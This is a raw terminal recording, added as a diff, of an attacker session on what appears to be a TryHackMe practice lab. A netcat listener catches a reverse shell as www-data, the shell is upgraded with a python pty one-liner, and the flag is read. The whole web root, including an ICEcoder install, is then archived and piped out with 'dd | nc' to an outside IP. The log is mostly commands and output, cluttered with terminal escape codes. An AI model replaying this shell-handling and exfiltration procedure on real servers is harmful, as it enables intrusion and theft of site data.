@@ -1,0 +1,106 @@
+Script started on 2025-04-23 15:44:05+03:00 [COMMAND="rlwrap nc -lnvp 6047" TERM="xterm-256color" TTY="/dev/pts/3" COLUMNS="104" LINES="27"]
+[?2004hlistening on [any] 6047 ...
+[Kconnect to [172.31.95.146] from (UNKNOWN) [172.31.80.1] 10173
+[K[K[?2004hid[?2004l[K[?2004hid
+[Kuid=33(www-data) gid=33(www-data) groups=33(www-data),27(sudo)
+[K[K[?2004hpython3 -c 'import pty;pty.sop[K[Kpawn("/bin/bash")[C[C[C[C[C[C[C[C[C[C[C[C[C'[?2004l[K[?2004hpython3 -c 'import pty;pty.spawn("/bin/bash")'
+[KTo run a command as administrator (user "root"), use "sudo <command>".
+See "man sudo_root" for details.
+
+[Kwww-data@python:/var/www/html/labs/lab3$ [Kwww-data@python:/var/www/html/labs/lab3$ [K[?2004hwww-data@python:/var/www/html/labs/lab3$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kexecute.php  flag.txt  index.php
+www-data@python:/var/www/html/labs/lab3$ [Kwww-data@python:/var/www/html/labs/lab3$ [K[?2004hwww-data@python:/var/www/html/labs/lab3$ cat flag.txt[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcat flag.txt
+[Kcat flag.txt
+[KTHM{basic_exploit_using_python}www-data@python:/var/www/html/labs/lab3$ [KTHM{basic_exploit_using_python}www-data@python:/var/www/html/labs/lab3$ [K[?2004hTHM{basic_exploit_using_python}www-data@python:/var/www/html/labs/lab3$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+[Kwww-data@python:/var/www/html/labs$ [Kwww-data@python:/var/www/html/labs$ [K[?2004hwww-data@python:/var/www/html/labs$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Klab1  lab2  lab3  lab4
+www-data@python:/var/www/html/labs$ [Kwww-data@python:/var/www/html/labs$ [K[?2004hwww-data@python:/var/www/html/labs$ cd ..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ..
+[Kcd ..
+[Kwww-data@python:/var/www/html$ [Kwww-data@python:/var/www/html$ [K[?2004hwww-data@python:/var/www/html$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kicecoder  index.php  labs  menu.php  templates
+www-data@python:/var/www/html$ [Kwww-data@python:/var/www/html$ [K[?2004hwww-data@python:/var/www/html$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 20
+drwxrwxr-x 11 www-data www-data 4096 Feb 10 10:48 icecoder
+-rw-r--r--  1 www-data www-data  742 Apr  3 04:43 index.php
+drwxrwxr-x  6 ubuntu   www-data 4096 Feb 24 11:22 labs
+-rw-r--r--  1 www-data www-data    2 Jan 30 12:25 menu.php
+drwxr-xr-x  2 www-data www-data 4096 Jun 20  2024 templates
+www-data@python:/var/www/html$ [Kwww-data@python:/var/www/html$ [K[?2004hwww-data@python:/var/www/html$ cd icecoder[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd icecoder
+[Kcd icecoder
+[Kwww-data@python:/var/www/html/icecoder$ [Kwww-data@python:/var/www/html/icecoder$ [K[?2004hwww-data@python:/var/www/html/icecoder$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[KLICENSE.md  classes	   editor.php  index.php  plugins
+README.md   composer.json  files.php   lang	  server
+assets	    data	   images      lib	  terminal.php
+www-data@python:/var/www/html/icecoder$ [Kwww-data@python:/var/www/html/icecoder$ [K[?2004hwww-data@python:/var/www/html/icecoder$ cd ../..[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd ../..
+[Kcd ../..
+[Kwww-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Khtml
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ [7mzip -r html.zip html[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hzip -r html.zip html
+[Kzip -r html.zip html
+[K
+Command 'zip' not found, but can be installed with:
+
+sudo apt install zip
+
+[Kwww-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ [7mtar -cJf html.tar.xz html[27m[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htar -cJf html.tar.xz html
+[Ktar -cJf html.tar.xz html
+[Ktar (child): html.tar.xz: Cannot open: Permission denied
+tar (child): Error is not recoverable: exiting now
+tar: html.tar.xz: Cannot write: Broken pipe
+tar: Child returned status 2
+tar: Error is not recoverable: exiting now
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ ls -l[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls -l
+[Kls -l
+[Ktotal 4
+drwxr-xr-x 5 www-data www-data 4096 Apr  3 04:43 html
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ [7mtar -cJf /tmp/html.tar.xz html[27m[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004htar -cJf /tmp/html.tar.xz html
+[Ktar -cJf /tmp/html.tar.xz html
+[Kwww-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ whic dd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhic dd
+[Kwhic dd
+[K
+Command 'whic' not found, did you mean:
+
+  command 'which' from deb debianutils (4.9.1)
+
+Try: sudo apt install <deb name>
+
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ which dd[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hwhich dd
+[Kwhich dd
+[K/usr/bin/dd
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ cd /tmp[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd /tmp
+[Kcd /tmp
+[Kwww-data@python:/tmp$ [Kwww-data@python:/tmp$ [K[?2004hwww-data@python:/tmp$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Khtml.tar.xz
+www-data@python:/tmp$ [Kwww-data@python:/tmp$ [K[?2004hwww-data@python:/tmp$ dd if=html.tar.xz status=progress | nc 10.8.61.245 4444[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hdd if=html.tar.xz status=progress | nc 10.8.61.245 4444
+[Kdd if=html.tar.xz status=progress | nc 10.8.61.245 4444
+[K229888 bytes (230 kB, 224 KiB) copied, 1 s, 184 kB/s[K229888 bytes (230 kB, 224 KiB) copied, 1 s, 184 kB/s[K229888 bytes (230 kB, 224 KiB) copied, 1 s, 184 kB/s492032 bytes (492 kB, 480 KiB) copied, 2 s, 224 kB/s[K492032 bytes (492 kB, 480 KiB) copied, 2 s, 224 kB/s[K229888 bytes (230 kB, 224 KiB) copied, 1 s, 184 kB/s492032 bytes (492 kB, 480 KiB) copied, 2 s, 224 kB/s
+1101+1 records in
+1101+1 records out
+563924 bytes (564 kB, 551 KiB) copied, 2.28104 s, 247 kB/s
+[Kwww-data@python:/tmp$ [Kwww-data@python:/tmp$ [K[?2004hwww-data@python:/tmp$ cd -[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd -
+[Kcd -
+[K/var/www
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Khtml
+www-data@python:/var/www$ [Kwww-data@python:/var/www$ [K[?2004hwww-data@python:/var/www$ cd html[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hcd html
+[Kcd html
+[Kwww-data@python:/var/www/html$ [Kwww-data@python:/var/www/html$ [K[?2004hwww-data@python:/var/www/html$ ls[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hls
+[Kls
+[Kicecoder  index.php  labs  menu.php  templates
+www-data@python:/var/www/html$ [Kwww-data@python:/var/www/html$ [K[?2004hwww-data@python:/var/www/html$ exit[?2004l[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[C[K[?2004hexit
+[Kexit
+exit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K[K[?2004hexit[?2004l[K[?2004hexit
+[K
+[?2004l
+Script done on 2025-04-23 15:57:08+03:00 [COMMAND_EXIT_CODE="1"]
